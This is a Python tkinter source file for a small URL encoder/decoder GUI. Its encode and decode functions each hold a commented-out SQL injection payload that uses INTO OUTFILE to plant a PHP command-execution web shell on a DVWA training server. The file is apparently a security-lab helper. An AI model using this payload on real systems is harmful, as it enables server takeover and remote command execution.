import urllib.parse
import tkinter

msg = """Welcome to URL Encoder/Decoder!\n\n""" + "="*20 + "\n\n"
def decode_url():
	url = entryUrl.get()
	output = "Original: " + url + "\n\n"
	textArea.insert(tkinter.END, output)
	#url = """id=%27+union+select+1%2C%27%3C%3Fphp+echo%28system%28%24_POST%5B%22cmd%22%5D%29%29%3B%3F%3E%27+INTO+OUTFILE+%27%2Fvar%2Fwww%2Fdvwa%2Fdefault.php%27+%23&Submit=Submit"""
	url = url.replace("+"," ")
	url = urllib.parse.unquote(urllib.parse.unquote(url))
	output = "Decoded: " + url + "\n\n" + "="*20 + "\n\n"
	textArea.insert(tkinter.END, output)
	entryUrl.delete(0,tkinter.END)
	entryUrl.focus()
	textArea.see(tkinter.END)

def encode_url():
	url = entryUrl.get()
	output = "Original: " + url + "\n\n"
	textArea.insert(tkinter.END, output)
	#url = """id=' union select 1,'<?php echo(system($_POST["cmd"]));?>' INTO OUTFILE '/var/www/dvwa/default.php' #&Submit=Submit"""
	url = urllib.parse.quote_plus(url)
	output = "Encoded: " + url + "\n\n" + "="*20 + "\n\n"
	textArea.insert(tkinter.END, output)
	entryUrl.delete(0,tkinter.END)
	entryUrl.focus()
	textArea.see(tkinter.END)

root = tkinter.Tk()
root.title('URL Encoder/Decoder')

frame = tkinter.Frame(root)
frame.pack(side = tkinter.TOP)

bottomframe = tkinter.Frame(root)
bottomframe.pack( side = tkinter.BOTTOM )


labelUrl = tkinter.Label(frame, font="bold", text="Paste URL here: ")
labelUrl.pack(side=tkinter.LEFT)

entryUrl = tkinter.Entry(frame)
entryUrl.pack(side=tkinter.LEFT)
entryUrl.focus()

textArea = tkinter.Text(bottomframe, background='white', font="Consolas", height=20, width=125)
textArea.pack(side=tkinter.LEFT, fill=tkinter.BOTH, anchor=tkinter.NW)
textArea.insert(tkinter.END, msg)

buttonEncode = tkinter.Button(frame, text="Encode", command=encode_url)
buttonEncode.pack(side=tkinter.TOP)

buttonDecode = tkinter.Button(frame, text="Decode", command=decode_url)
buttonDecode.pack(side=tkinter.TOP)

root.mainloop()
